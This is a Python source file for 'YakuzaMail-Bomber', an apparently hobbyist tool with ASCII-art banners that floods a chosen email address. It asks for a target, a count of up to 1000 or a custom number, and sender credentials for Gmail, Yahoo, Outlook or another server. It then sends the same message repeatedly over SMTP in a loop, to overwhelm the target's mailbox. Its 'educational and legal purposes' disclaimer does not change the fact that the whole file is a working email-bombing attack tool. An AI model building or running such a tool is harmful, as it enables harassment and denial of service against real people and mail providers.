
"""
YakuzaMail-Bomber Can send emails massively to a list of email addresses or and email address,
    then try to Denial the Target Email Services and shutting it down for a while time.

*** Disclaimer: ===> *** this tool is only used for educational and legal purposes <=== ***

Author: Davood.Yakuza
---
Develop Start Date: 11/3/2024 => 14 aban 1403
Develop End Date:
"""
from pathlib import Path
import sys

projectRoot = Path(__file__).resolve().parent.parent
sys.path.append(str(projectRoot))

""" Section 0: Setting UP Requires Materials """

# Step 0.1: Import Requires
from smtplib import SMTP
from sys import exit
from collections import namedtuple
# from main import main as MainMenu
from miscs.colors import fColors, bColors
from miscs.string_format import stringFormat
from main import main as MainMenu

from termcolor import colored

# Step 0.5: Define Colors namedtuple, which contains all fColors Colors but as Named Tuple
Colors = namedtuple('Colors', ['BLACK','RED', 'GREEN', 'YELLOW', 'BLUE', 'MAGENTA', 'CYAN', 'WHITE'])
colors = Colors('\033[30m', '\033[31m', '\033[32m', '\033[33m', '\033[34m', '\033[35m', '\033[36m', '\033[37m')


def rainbow_text(text):
    colors = ['red', 'yellow', 'green', 'cyan', 'blue', 'magenta']
    rainbow_banner = ""

    for i, char in enumerate(text):
        color = colors[i % len(colors)]
        rainbow_banner += colored(char, color) # noqa

    return rainbow_banner


# Step 0.6: Define Banner Function to print tool banner
def banner():
    print(fColors.BLACK + bColors.WHITE + stringFormat.BOLD + "\n[+*+]-->> YakuzaMail-Bomber v1.0 <<--[+*+]\n" + stringFormat.RESET)
    print(fColors.LIGHT_YELLOW + "[+*+] Made with Python by Brain of a Yakuza [+*+]")

    bannerContent = """
    ´´´´´´´´´´´´´´´´´´´´´´´$¶´´´´´¶´´´´´¶¢
´´´´´´´´´´´¶¶¶¶¶¶¶´´´´´´´¶¢´´´¶´´´ø¶                   ╭╮╭╮╭╮╱╱╭╮╱╭╮╱╱╱╱╱╱╱╭╮╱╱╱╱╱╱╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╭╮╭╮╱╱╭╮╱╭╮
´´´´´´´´´´¶¶´´´´ø¶¶¶´´´´´´oø´´ø´´øo                    ┃┃┃┃┃┃╱╭╯╰┳╯╰╮╱╱╱╱╱╱┃┃╱╱╱╱╱╱╰╮╭╮┃╱╱╱╱╱╱╱╱╱╱╱╱╱┃┃┃╰╮╭╯┃╱┃┃
´´´´´´´´´´¶7´´´´´´´¶¶¶´´´´´´1´´´1´´´´1o                ┃┃┃┃┃┣━╋╮╭┻╮╭╋━━┳━╮╱┃╰━┳╮╱╭╮╱┃┃┃┣━━┳╮╭┳━━┳━━┳━╯┃╰╮╰╯╭┻━┫┃╭┳╮╭┳━━━┳━━╮
´´´´´´´¶¶¶¶¶¶¶´´´´´´´¶¶¶7´´´´´´´´1o¶¶¶ø                ┃╰╯╰╯┃╭╋┫┃╱┃┃┃┃━┫╭╮╮┃╭╮┃┃╱┃┃╱┃┃┃┃╭╮┃╰╯┃╭╮┃╭╮┃╭╮┃╱╰╮╭┫╭╮┃╰╯┫┃┃┣━━┃┃╭╮┃
´´´´´´´¶¶¶¶¶¶¶´´´´´´´´´¶¶¶¶¶¶¶¶´´1                     ╰╮╭╮╭┫┃┃┃╰╮┃╰┫┃━┫┃┃┃┃╰╯┃╰━╯┃╭╯╰╯┃╭╮┣╮╭┫╰╯┃╰╯┃╰╯┃╱╱┃┃┃╭╮┃╭╮┫╰╯┃┃━━┫╭╮┃
´´´´´o¶¶¶¶¶¶¶¶¶ø´´´´´´´´´´´´´´´´´´o$¢                  ╱╰╯╰╯╰╯╰┻━╯╰━┻━━┻╯╰╯╰━━┻━╮╭╯╰━━━┻╯╰╯╰╯╰━━┻━━┻━━╯╱╱╰╯╰╯╰┻╯╰┻━━┻━━━┻╯╰╯
´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´´´´´¢´´1ø´´´1¶¶                ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃  Written BY:
´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶o´´´´´´´1$´´´¶                      ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯             Davood Yakuza
´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´´¶´´´´o¶´
´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´¶¶
´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´
´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´
´´´´´¶¶¶¶¶¶¶¶¶¶¶¶´
´´´´´´´¶¶¶¶¶¶¶¶
    """

    bannerContent = rainbow_text(bannerContent)

    print(bannerContent)


""" Section 1: Define Email_Bomber Class and Email_Bomber Methods  """

# noinspection PyAttributeOutsideInit,SpellCheckingInspection
class Email_Bomber:
    count = 0

    # Step 1.1: Define Initiator Function of Email_Bomber Class
    def __init__(self):
        try:

            print(fColors.BLACK+bColors.WHITE+stringFormat.BOLD
                  + "\n[+*+] Initializing Yakuza Email BOMBER... [+*+]\n"  + stringFormat.RESET+bColors.RESET)

            self.backToMenu = input(fColors.LIGHT_YELLOW+"[?] Back to main menu or Continue? "
                                                         "Press Y: (Main Menu), or Press Enter to Continue... ").lower()
            if self.backToMenu.startswith("y"):
                MainMenu.launcher()

            x = 0
            while x != 10:
                # Give Target Email and Email Counts from User
                self.target = str(input(fColors.LIGHT_YELLOW+"[?] Target Email Address: "))
                self.mode = int(input(fColors.LIGHT_YELLOW+"[?] Enter BOMB Mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) => "))

                # Validator for Options, if wrong tries to get inputs again
                if self.mode > 4 or self.mode < 1:
                    print(fColors.RED + "[-] Invalid Option. Try Again. ")

                x = 10



        except Exception as e:
            print(bColors.RED + f"[-] Error while gathering Target Info.\nError: {str(e)}")


    # Step 1.2: Define bomb() function to setting up the bomb amount option
    def bomb_setup(self): # noqa
        try:
            print(fColors.BLACK+bColors.WHITE+stringFormat.BOLD
                  + "[+*+] Setting UP the Yakuza Mail BOMB ... [+*+]\n"  + stringFormat.RESET+bColors.RESET)

            self.amount = None

            if self.mode == 1:
                self.amount = int(1000) # noqa
                print(fColors.GREEN + f"[+] Bomb Amount Set on {self.amount}")

            elif self.mode == 2:
                self.amount = int(500) # noqa
                print(fColors.GREEN + f"[+] Bomb Amount Set on {self.amount}")

            if self.mode == 3:
                self.amount = int(250) # noqa
                print(fColors.GREEN + f"[+] Bomb Amount Set on {self.amount}")

            else:
                self.amount = int(input(fColors.LIGHT_YELLOW+"[?] Ok, now Choose Custom Amount: "))
                # print(fColors.GREEN + f"[+] Custom Mode Bomb Amount Chosen, Amount Set on {self.amount}")

            print("\n" + fColors.LIGHT_BLUE
                  + f"[+*+] You have selected  => \nCustom Bomb MODE: {self.mode} with {self.amount} Mail Count. \nTarget Email: {self.target}\n")

        except Exception as e:
            print(f"{fColors.RED}[-] Error while Setting UP BOMB Options. \n[-] Error: {fColors.WHITE}{str(e)}")

    # Step 1.3: Define email() Function to Initialized Email Configuration
    # noinspection PyAttributeOutsideInit
    def email_setup(self): # noqa
        try:
            print(fColors.BLACK+bColors.WHITE+stringFormat.BOLD
                  + "[+*+] Setting UP Sender EMAIL... [+*+]\n"  + stringFormat.RESET)

            # Get Mail Server Type from user
            self.server = str(input(fColors.LIGHT_YELLOW
                                    + "[?] Enter Email Server | or Select Pre-Made Options[number only]:  "
                                      "1:Gmail, 2:Yahoo, 3:Outlook => "))

            # Define local variables
            premade = ['1', '2', '3']
            defaultPort = True

            if self.server not in premade:
                defaultPort = False
                self.port = int(input(fColors.LIGHT_YELLOW + "[?] Enter Mail Server Port => "))

            if defaultPort:
                # 587 is the default port for Gmail, Yahoo, Outlook
                self.port = 587

            # Set the server based on the selected option
            if self.server == '1':
                self.server = "smtp.gmail.com"

            elif self.server == '2':
                self.server = "smtp.mail.yahoo.com"

            elif self.server == '3':
                self.server = "smtp-mail.outlook.com"


            # Give Sender Email, Email Password, Email Subject and Email Message from the user
            self.fromAddr = str(input(fColors.LIGHT_YELLOW + "[?]  Enter Sender(From) Email Address => "))
            self.fromPwd = str(input(fColors.LIGHT_YELLOW + "[?] Enter Sender(From) Password => "))
            self.subject = str(input(fColors.LIGHT_YELLOW + "[?] Enter Email Subject => "))
            self.message = str(input(fColors.LIGHT_YELLOW + "[?] Enter Email Message => "))

            # Now Create Message
            self.msg = f"From: {self.fromAddr}\nTo: {self.target}\nSubject: {self.subject}\n\n{self.message}\n"

            # Create SMTP Object
            self.sender = SMTP(self.server, self.port)
            self.sender.ehlo()  # Send Digital Hello
            self.sender.starttls()  # Start TLS Encryption for Secure Connection
            self.sender.ehlo()
            self.sender.login(self.fromAddr, self.fromPwd)

        except Exception as e:
            print(f"{fColors.RED}[-] Error while Connect and Login to Sender(From) Email . "
                  f"\n[-] Error: {fColors.WHITE}{str(e)}")

    # Step 1.4: Define send() function to send an email
    def send_mail(self):
        try:
            self.sender.sendmail(self.fromAddr, self.target, self.msg)
            self.count += 1
            print(fColors.BLUE + f"[+] BOMB Count: {self.count}.")

        except Exception as e:
            print(f"{fColors.RED}[-] Error while Sending an Email. \n[-] Error: {fColors.WHITE}{str(e)}")

    # Step 1.5: Define attack() Function to Launch the BOMB(Attack)
    def launch_attack(self): # noqa
        print(fColors.BLACK+bColors.WHITE+stringFormat.BOLD
              + "[+*+] Launching the Yakuza-BOMB... [+*+]\n"  + stringFormat.RESET)

        # Launch Bomb by Sending Emails massively to the Target Email Address
        mailAmount = self.amount + 1
        for email in range(mailAmount):
            self.send_mail()

        # Close SMTP sender connection and then show the success message
        self.sender.close()
        print(fColors.GREEN + f"[+] Yakuza-BOMB Successfully Launched, {self.count} Emails Sent and Attack Finished .")

        self.backToMenu = input(fColors.LIGHT_YELLOW+"[?] Do you want to go back to the Main Menu? (y/n): ").lower()

        if self.backToMenu.startswith("y"):
            MainMenu.launcher()

        else:
            print(fColors.MAGENTA + "[*] Exiting the program, Goodbye and Good luck...")
            exit(0)


def launcher():
    banner()

    bomb = Email_Bomber()

    # Setting up the bomb amount option by Calling bomb.bomb()
    bomb.bomb_setup()

    # Initialized Email Configuration by Calling bomb.email()
    bomb.email_setup()

    # Launch the Yakuza Email BOMB, the Attack
    bomb.launch_attack()


# Step 1.6: Implement Main Execution
if __name__ == '__main__':
    launcher()




















